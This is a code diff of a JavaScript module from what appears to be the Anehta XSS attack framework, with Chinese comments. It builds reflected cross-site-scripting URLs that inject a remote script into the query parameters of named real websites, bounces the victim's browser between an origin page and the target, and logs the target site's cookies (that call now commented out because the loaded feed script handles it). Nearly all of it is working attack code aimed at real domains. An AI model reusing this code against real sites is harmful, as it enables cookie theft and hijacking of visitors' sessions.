@@ -9,28 +9,24 @@
 
 
 ////////////////////////////////////////////////////////////
-var target_domain = "www.playback.fr";
+var target_domain = "www.underwoodlandcompany.com";
 //var target="http://www.b.com/4.html#'><script src=\'"+feedurl+"\' ></script><'"; 
-var target="http://www.playback.fr/recherche.php?search=<script%20src="+feedurl+"%20></script>+&button=OK";
-//var target="http://www.underwoodlandcompany.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
+var target="http://www.underwoodlandcompany.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
 //var target="http://www.waikikicondosearch.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
 //var target="http://www.gobolinux.org/?page=<script src="+feedurl+"></script>";
 
 // 前页面
-//var org_url = "http://www.playback.fr/recherche.php?search=<script%20src=http://www.secwiki.com/anehta/feed.js%20></script>+&button=OK";  
 var org_url = "http://www.secwiki.com/anehta/test.html";
 var org_domain = "www.secwiki.com";
 
 
-////////////////////////////////////////////////////////////
-// 开始执行功能
-///////////////////////////////////////////////////////////
 
 // 如果是当前页面，则向目标提交
 if ($d.domain == org_domain){
-   if ($d.cookie.indexOf("xsstag=1") < 0){
+   if (anehta.dom.checkCookie("boomerang") == false){
    	  // 在cookie里做标记，只弹一次
-	    $d.cookie="xsstag=1; "+$d.cookie;
+	    anehta.dom.addCookie("boomerang", "x");
+	    //alert(anehta.dom.getCookie("boomerang"));
    	  setTimeout( function (){
 	      //alert(target);
         try {
@@ -43,14 +39,15 @@ if ($d.domain == org_domain){
    }
 }
 
-//////////////////////////////////////////////////////////
+
 // 如果是目标站点，则重定向回前页面 
 if ($d.domain == target_domain){
 	 
-	 setTimeout( function (){	
-     anehta.logger.logCookie();
+	 setTimeout( function (){
+	 	 //如果远程已经在feed.js中引入了clx模块,则不需要再次重复记录cookie	
+     //anehta.logger.logCookie();
 
-     //////////////////////////////////////////////////////
+
      // 弹回原来的页面。
      anehta.net.postForm(org_url);
    },
